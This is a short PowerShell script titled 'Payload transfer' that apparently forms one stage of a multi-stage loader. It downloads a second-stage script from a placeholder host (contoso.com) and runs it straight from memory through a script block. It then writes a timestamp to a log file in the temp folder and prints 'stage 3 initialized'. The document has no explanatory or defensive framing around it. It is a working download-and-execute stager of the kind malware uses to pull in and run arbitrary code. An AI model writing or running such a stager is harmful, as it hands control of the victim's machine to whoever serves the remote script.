# Payload transfer
$RemoteUrl = 'http://contoso.com/stage2.ps1'
$PayloadText = (New-Object Net.WebClient).DownloadString($RemoteUrl)
& ([ScriptBlock]::Create($PayloadText))
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 3 initialized"
